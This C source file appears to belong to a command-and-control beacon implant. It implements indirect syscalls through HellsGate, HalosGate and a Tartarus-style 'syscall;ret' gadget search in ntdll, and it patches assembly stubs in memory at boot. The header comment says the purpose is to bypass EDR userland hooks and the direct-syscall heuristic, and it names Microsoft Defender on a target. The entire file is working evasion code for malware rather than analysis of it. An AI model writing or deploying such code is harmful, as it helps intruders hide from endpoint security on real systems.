/* beacon/src/Core/Syscall.c
 * P1 — indirect syscalls: resolve syscall numbers (HellsGate, HalosGate
 * fallback) and a Tartarus in-ntdll `syscall;ret` gadget, patch the
 * asm stubs (asm/Syscall.x64.asm) in-place at boot, and point each
 * Nax->Ntdll.NtX function pointer at its stub.
 *
 * Result: every Nt* call the beacon makes executes `syscall` INSIDE ntdll
 * (indirect, never direct) — bypasses userland ntdll-stub hooks and avoids
 * the "syscall from non-image region" heuristic that catches direct syscalls.
 *
 * Per-syscall graceful fallback: if the SSN can't be resolved OR the stub
 * template bytes don't match OR the page protect fails, that NtX pointer is
 * left at the direct NaxGetProc result (correct, just not evasive) — so a
 * resolution hiccup never crashes the beacon with a wrong SSN.
 *
 * NOTE on Cloud Defender: Defender uses ETW-TI (kernel) + AMSI, NOT userland
 * ntdll prologue hooks, so on the OSAI target HellsGate reads every SSN
 * directly and HalosGate never triggers. HalosGate is robustness for EDRs
 * that DO hook stubs. Indirect syscalls don't defeat kernel ETW-TI — that's
 * a P3 (AMSI/ETW) concern.
 *
 * No bare libc: per-field immediate assignments only (no aggregate-init that
 * gcc would lower to a memcpy from .rdata — see bof-builder LESSONS U2 and
 * Config.c's per-byte-store discipline). */

#include "Nax.h"
#include "Syscall.h"

/* ========= [ HellsGate — read SSN from a clean ntdll stub ] ========= */
static FUNC DWORD NaxHellsGate( PBYTE stub ) {
    if ( ! stub ) return NAX_SC_SSN_INVALID;
    if ( stub[ 0 ] != NAX_NT_PROLOGUE_0 || stub[ 1 ] != NAX_NT_PROLOGUE_1 ||
         stub[ 2 ] != NAX_NT_PROLOGUE_2 || stub[ 3 ] != NAX_NT_PROLOGUE_3 )
        return NAX_SC_SSN_INVALID;
    return *(DWORD*)( stub + NAX_NT_OFF_SSN );
}

/* ========= [ HalosGate — derive a hooked stub's SSN from a clean neighbor ] =========
 * Walks the ntdll export table (name order) to find the target's index, then
 * scans outward for a clean (unhooked) neighbor and offsets the SSN assuming
 * SSNs are sequential in export order. Bounded ±256 and range-validated; on any
 * doubt returns INVALID so the caller falls back to the direct (hooked) stub
 * rather than risking a wrong-SSN crash.                                                */
static FUNC DWORD NaxHalosGate( HMODULE hNtdll, UINT32 targetHash ) {
    PBYTE b = B_PTR( hNtdll );
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)b;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)( b + dos->e_lfanew );
    DWORD expRva = nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress;
    if ( ! expRva ) return NAX_SC_SSN_INVALID;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)( b + expRva );
    PDWORD names = (PDWORD)( b + exp->AddressOfNames );
    PWORD  ords  = (PWORD)(  b + exp->AddressOfNameOrdinals );
    PDWORD funcs = (PDWORD)( b + exp->AddressOfFunctions );
    DWORD  n     = exp->NumberOfNames;

    DWORD tgt = n;
    for ( DWORD i = 0; i < n; i++ ) {
        if ( NaxHashStr( (PCHAR)( b + names[ i ] ) ) == targetHash ) { tgt = i; break; }
    }
    if ( tgt == n ) return NAX_SC_SSN_INVALID;

    for ( DWORD d = 1; d < 256; d++ ) {
        for ( INT dir = -1; dir <= 1; dir += 2 ) {
            if ( dir < 0 && tgt < d )            continue;
            if ( dir > 0 && tgt + d >= n )        continue;
            DWORD idx   = ( dir < 0 ) ? ( tgt - d ) : ( tgt + d );
            PBYTE nstub = b + funcs[ ords[ idx ] ];
            DWORD nssn  = NaxHellsGate( nstub );
            if ( nssn == NAX_SC_SSN_INVALID ) continue;
            INT32 delta = (INT32)tgt - (INT32)idx;     /* ssn(tgt) = ssn(idx) + (tgt-idx) */
            INT32 ssn   = (INT32)nssn + delta;
            if ( ssn < 0 || ssn > 0x2000 ) return NAX_SC_SSN_INVALID;
            return (DWORD)ssn;
        }
    }
    return NAX_SC_SSN_INVALID;
}

/* ========= [ Tartarus gate — find a `syscall; ret` gadget in ntdll .text ] ========= */
static FUNC PVOID NaxFindSyscallGadget( PBYTE ntdll ) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    if ( dos->e_magic != IMAGE_DOS_SIGNATURE ) return NULL;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)( ntdll + dos->e_lfanew );
    if ( nt->Signature != IMAGE_NT_SIGNATURE ) return NULL;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION( nt );
    for ( WORD i = 0; i < nt->FileHeader.NumberOfSections; i++ ) {
        if ( ! ( sec[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) continue;
        PBYTE p   = ntdll + sec[ i ].VirtualAddress;
        DWORD len = sec[ i ].Misc.VirtualSize;
        if ( len < 3 ) continue;
        for ( DWORD j = 0; j < len - 2; j++ ) {
            if ( p[ j ] == NAX_SC_GADGET_BYTE0 &&
                 p[ j + 1 ] == NAX_SC_GADGET_BYTE1 &&
                 p[ j + 2 ] == NAX_SC_GADGET_BYTE2 )
                return (PVOID)( p + j );   /* any in-ntdll syscall;ret passes the heuristic */
        }
    }
    return NULL;
}

/* per-field immediate assignment — no aggregate initializer (avoids a gcc
 * .rdata→memcpy lowering). see Config.c / bof-builder LESSONS U2.            */
#define NAXE( idx, h, slotfield ) \
    E[ idx ].hash = (h); \
    E[ idx ].slot = (PVOID*)&Nax->Ntdll.slotfield

/* ========= [ NaxScStubAddr — PC-relative stub-address resolver ] =========
 * CRITICAL: the NaxSc_* asm stubs live in the beacon's flat .text blob
 * (objcopy --dump-section .text), which has NO .reloc table. gcc -fPIC emits a
 * `.refptr.NaxSc_*` GOT entry (an ABSOLUTE link-time pointer stored in .text)
 * whenever an external function's address is STORED to a memory lvalue — e.g.
 * `E[i].stub = (PVOID)(NaxSc_NtX)`. That pointer is never relocated when the
 * loader maps the beacon at a base != 0x10000000, so the first stub read faults
 * at boot ("prints nothing, no callback"). It is the ONLY non-RIP-relative
 * reference in the whole beacon, which is why P1-off (direct resolve) worked and
 * P1-on crashed.
 *
 * gcc emits a direct PC-relative `lea rax,[rip+NaxSc_*]` (no .refptr, no reloc
 * needed) only when the address is RETURNED in a register, not stored. So every
 * stub address is routed through this noinline wrapper (register return). The
 * `noinline` is mandatory: at -Os gcc inlines `static` helpers, and the inlined
 * store would re-introduce the .refptr GOT. A switch (not base+stride) keeps it
 * robust to stub-size/layout changes.                                                            */
__attribute__( ( noinline ) ) static FUNC PVOID NaxScStubAddr( UINT32 i ) {
    switch ( i ) {
    case 0:  return (PVOID)NaxSc_NtAllocateVirtualMemory;
    case 1:  return (PVOID)NaxSc_NtProtectVirtualMemory;
    case 2:  return (PVOID)NaxSc_NtFreeVirtualMemory;
    case 3:  return (PVOID)NaxSc_NtOpenProcessToken;
    case 4:  return (PVOID)NaxSc_NtQueryInformationToken;
    case 5:  return (PVOID)NaxSc_NtQueryInformationProcess;
    case 6:  return (PVOID)NaxSc_NtSetInformationProcess;
    case 7:  return (PVOID)NaxSc_NtClose;
    case 8:  return (PVOID)NaxSc_NtQuerySystemInformation;
    case 9:  return (PVOID)NaxSc_NtQueryVirtualMemory;
    case 10: return (PVOID)NaxSc_NtOpenProcess;
    case 11: return (PVOID)NaxSc_NtTerminateProcess;
    }
    return (PVOID)0;
}

/* ========= [ NaxSyscallsInit — resolve, patch stubs, wire pointers ] ========= */
FUNC UINT32 NaxSyscallsInit( PNAX_INSTANCE Nax ) {
    HMODULE hNtdll = Nax->Ntdll.Handle;
    if ( ! hNtdll || ! Nax->Kernel32.VirtualProtect ) return 0;

    PVOID gadget = NaxFindSyscallGadget( B_PTR( hNtdll ) );
    Nax->Syscalls.Gadget = gadget;   /* may be NULL -> every slot falls back to direct */
    NaxDbg( Nax, "sc: enter hNtdll=%p VP=%p gadget=%p", hNtdll, Nax->Kernel32.VirtualProtect, gadget );

    struct {
        UINT32  hash;
        PVOID   stub;     /* asm stub address (NaxSc_NtX) */
        PVOID*  slot;     /* &Nax->Ntdll.NtX */
        DWORD   ssn;      /* resolved (or INVALID) */
        PBYTE   real;     /* real ntdll stub (direct fallback) */
    } E[ NAX_SC_COUNT ];   /* uninitialized stack — fields set below */

    NAXE( 0,  H_NTALLOCATEVIRTUALMEMORY,   NtAllocateVirtualMemory );
    NAXE( 1,  H_NTPROTECTVIRTUALMEMORY,    NtProtectVirtualMemory );
    NAXE( 2,  H_NTFREEVIRTUALMEMORY,       NtFreeVirtualMemory );
    NAXE( 3,  H_NTOPENPROCESSTOKEN,        NtOpenProcessToken );
    NAXE( 4,  H_NTQUERYINFORMATIONTOKEN,   NtQueryInformationToken );
    NAXE( 5,  H_NTQUERYINFORMATIONPROCESS, NtQueryInformationProcess );
    NAXE( 6,  H_NTSETINFORMATIONPROCESS,   NtSetInformationProcess );
    NAXE( 7,  H_NTCLOSE,                   NtClose );
    NAXE( 8,  H_NTQUERYSYSTEMINFORMATION,  NtQuerySystemInformation );
    NAXE( 9,  H_NTQUERYVIRTUALMEMORY,      NtQueryVirtualMemory );
    NAXE( 10, H_NTOPENPROCESS,             NtOpenProcess );
    NAXE( 11, H_NTTERMINATEPROCESS,        NtTerminateProcess );

    UINT32 patched = 0;
    PBYTE spanLo = NULL, spanHi = NULL;

    for ( UINT32 i = 0; i < NAX_SC_COUNT; i++ ) {
        E[ i ].stub = NaxScStubAddr( i );   /* PC-relative lea (via noinline wrapper), NOT .refptr GOT */
        PBYTE realStub = B_PTR( NaxGetProc( hNtdll, E[ i ].hash ) );
        E[ i ].real = realStub;

        DWORD ssn = NaxHellsGate( realStub );
        if ( ssn == NAX_SC_SSN_INVALID ) ssn = NaxHalosGate( hNtdll, E[ i ].hash );
        E[ i ].ssn = ssn;
        Nax->Syscalls.Ssn[ i ] = ssn;

        if ( ssn == NAX_SC_SSN_INVALID || ! gadget ) {
            *E[ i ].slot = (PVOID)realStub;        /* hooked / no gadget: direct */
            NaxDbg( Nax, "sc[%u] -> DIRECT (no ssn/gadget)", i );
            continue;
        }

        PBYTE stub = B_PTR( E[ i ].stub );
        /* verify asm template bytes before we trust the patch offsets (safety net:
         * a layout drift degrades this slot to direct rather than corrupting it) */
        if ( stub[ 0 ] != NAX_SC_BYTE0_MOV_R10 || stub[ 1 ] != NAX_SC_BYTE1_MOV_R10 ||
             stub[ 2 ] != NAX_SC_BYTE2_MOV_R10 || stub[ 3 ] != NAX_SC_BYTE_MOV_EAX ||
             stub[ 8 ] != NAX_SC_BYTE_MOV_R11  || stub[ 9 ] != NAX_SC_BYTE_MOV_R11_2 ) {
            *E[ i ].slot = (PVOID)realStub;        /* template drift: direct */
            NaxDbg( Nax, "sc[%u] -> DIRECT (template drift)", i );
            continue;
        }

        if ( ! spanLo || stub < spanLo ) spanLo = stub;
        if ( ! spanHi || ( stub + NAX_SC_STUB_SIZE ) > spanHi ) spanHi = stub + NAX_SC_STUB_SIZE;
        *E[ i ].slot = (PVOID)stub;                /* route NtX through the stub */
        patched++;
    }

    if ( patched && gadget && spanLo && spanHi ) {
        UINT_PTR lo = ( UINT_PTR )spanLo & ~( ( UINT_PTR )( NAX_PAGE_SIZE - 1 ) );
        UINT_PTR hi = ( ( UINT_PTR )spanHi + ( NAX_PAGE_SIZE - 1 ) ) & ~( ( UINT_PTR )( NAX_PAGE_SIZE - 1 ) );
        DWORD old = 0;

        NaxDbg( Nax, "sc: patch span lo=%p hi=%p size=0x%lx", (PVOID)lo, (PVOID)hi, (ULONG)( hi - lo ) );
        if ( Nax->Kernel32.VirtualProtect( (PVOID)lo, (SIZE_T)( hi - lo ), PAGE_READWRITE, &old ) ) {
            for ( UINT32 i = 0; i < NAX_SC_COUNT; i++ ) {
                if ( E[ i ].ssn == NAX_SC_SSN_INVALID ) continue;
                PBYTE stub = B_PTR( E[ i ].stub );
                *(DWORD*)( stub + NAX_SC_OFF_SSN )    = E[ i ].ssn;
                *(PVOID*)(  stub + NAX_SC_OFF_GADGET ) = gadget;
            }
            Nax->Kernel32.VirtualProtect( (PVOID)lo, (SIZE_T)( hi - lo ), old, &old );
            NaxDbg( Nax, "sc: patched %u/%u (gadget=%p)", patched, (UINT32)NAX_SC_COUNT, gadget );
            NaxDbgx( Nax, "syscall: %u/%u indirect (gadget=%p)", patched, (UINT32)NAX_SC_COUNT, gadget );
        } else {
            /* protect failed — fall back every slot to direct */
            for ( UINT32 i = 0; i < NAX_SC_COUNT; i++ ) *E[ i ].slot = (PVOID)E[ i ].real;
            patched = 0;
            NaxDbg( Nax, "sc: VirtualProtect FAILED - all direct" );
            NaxDbgx( Nax, "syscall: VirtualProtect failed - direct resolve only" );
        }
    } else if ( ! patched ) {
        NaxDbg( Nax, "sc: no stubs patched - direct only (gadget=%p)", gadget );
        NaxDbgx( Nax, "syscall: direct resolve only (gadget=%p)", gadget );
    }

    NaxDbg( Nax, "sc: DONE %u/%u  NtAllocVM=%p NtProtectVM=%p NtFreeVM=%p",
            patched, (UINT32)NAX_SC_COUNT,
            (PVOID)Nax->Ntdll.NtAllocateVirtualMemory,
            (PVOID)Nax->Ntdll.NtProtectVirtualMemory,
            (PVOID)Nax->Ntdll.NtFreeVirtualMemory );

    return patched;
}